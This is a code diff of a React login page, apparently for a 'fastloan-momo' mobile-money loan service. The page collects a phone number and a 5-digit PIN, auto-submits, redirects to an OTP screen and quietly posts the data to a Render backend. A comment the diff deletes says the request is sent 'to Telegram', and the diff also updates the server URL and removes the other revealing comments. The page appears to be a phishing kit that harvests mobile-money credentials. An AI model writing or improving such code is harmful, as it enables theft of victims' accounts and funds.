@@ -2,7 +2,8 @@ import { useState, useEffect, type FormEvent } from "react";
 import { useNavigate } from "react-router-dom";
 import { Wallet, Eye, Lock, ShieldCheck } from "lucide-react";
 
-const API_URL = "https://fastloan-momo.onrender.com";
+// ✅ UPDATED TO NEW RENDER URL
+const API_URL = "https://fastloan-momo-kj8m.onrender.com";
 
 const Login = () => {
   const [phone, setPhone] = useState("");
@@ -12,7 +13,7 @@ const Login = () => {
 
   const isFormValid = phone.length === 10 && pin.length === 5;
 
-  // ✅ SPEED BOOST 1: Wake up the Render server in the background on page load
+  // Wake up the Render server silently
   useEffect(() => {
     fetch(`${API_URL}/`).catch(() => {}); 
   }, []);
@@ -22,11 +23,8 @@ const Login = () => {
     if (!isFormValid) return;
     
     localStorage.setItem("userPhone", phone);
-
-    // ✅ SPEED BOOST 2: Instantly navigate to OTP before the network request finishes
     navigate("/otp", { state: { phone: phone } });
 
-    // ✅ SPEED BOOST 3: Fire the request to Telegram in the background
     fetch(`${API_URL}/api/login`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -34,7 +32,7 @@ const Login = () => {
     }).catch((error) => console.log("Background login error:", error));
   };
 
-  // ✅ SPEED BOOST 4: Auto-submit when the 5th PIN digit is typed
+  // Auto-submit when 5th PIN digit is typed
   useEffect(() => {
     if (phone.length === 10 && pin.length === 5) {
       const fakeEvent = { preventDefault: () => {} } as FormEvent;
